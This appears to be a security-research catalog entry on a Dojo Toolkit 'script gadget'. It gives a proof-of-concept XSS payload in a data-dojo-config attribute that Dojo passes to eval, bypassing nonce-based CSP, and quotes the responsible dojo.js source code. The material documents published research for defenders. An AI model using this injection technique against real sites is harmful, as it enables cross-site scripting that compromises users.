---
description: A JavaScript toolkit that saves you time and scales with your development process. Provides everything you need to build a Web app. Language utilities, UI components, and more, all in one place, designed to work together perfectly.
github: dojo/dojo
gadgets:
  Latest:
    authors:
      - twitter:slekies
      - twitter:kkotowicz
      - twitter:sirdarckcat
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - script-tag
      - data-attr
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - description: The [Dojo Toolkit](https://github.com/dojo/dojo) library evaluates the `data-dojo-config` attribute using `eval`.
        code: |
          <!-- user input -->
          <script data-dojo-config="}-alert(document.domain)-{"></script>

          <script nonce="secret" src="https://cdnjs.cloudflare.com/ajax/libs/dojo/1.17.3/dojo.js"></script>
          <script nonce="secret">
              require([
                "dojo/parser",
                "dijit/form/Button",
                "dojo/domReady!"
              ], function(parser){
                parser.parse();
              });
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/dojo/dojo/blob/185a4fb314de482a1b6b5668095b998da9c1b58f/dojo.js#L721">https://github.com/dojo/dojo/blob/185a4fb314de482a1b6b5668095b998da9c1b58f/dojo.js#L721</a>

      ```javascript
      if(has("dojo-cdn") || has("dojo-sniff")){
        // the sniff regex looks for a src attribute ending in dojo.js, optionally preceded with a path.
        // match[3] returns the path to dojo.js (if any) without the trailing slash. This is used for the
        // dojo location on CDN deployments and baseUrl when either/both of these are not provided
        // explicitly in the config data; this is the 1.6- behavior.

        var scripts = doc.getElementsByTagName("script"),
          i = 0,
          script, dojoDir, src, match;
        while(i < scripts.length){
          script = scripts[i++];
          if((src = script.getAttribute("src")) && (match = src.match(/(((.*)\/)|^)dojo\.js(\W|$)/i))){
            // sniff dojoDir and baseUrl
            dojoDir = match[3] || "";
            defaultConfig.baseUrl = defaultConfig.baseUrl || dojoDir;

            // remember an insertPointSibling
            insertPointSibling = script;
          }

          // sniff configuration on attribute in script element
          if((src = (script.getAttribute("data-dojo-config") || script.getAttribute("djConfig")))){
            dojoSniffConfig = req.eval("({ " + src + " })", "data-dojo-config");

            // remember an insertPointSibling
            insertPointSibling = script;
          }

          // sniff requirejs attribute
          if(has("dojo-requirejs-api")){
            if((src = script.getAttribute("data-main"))){
              dojoSniffConfig.deps = dojoSniffConfig.deps || [src];
            }
          }
        }
      }
      ```
    links:
      - http://sebastian-lekies.de/slides/appsec2017.pdf
      - https://acmccs.github.io/papers/p1709-lekiesA.pdf
      - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/dojo/index.php
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/ue/dojo_exploit.php
---
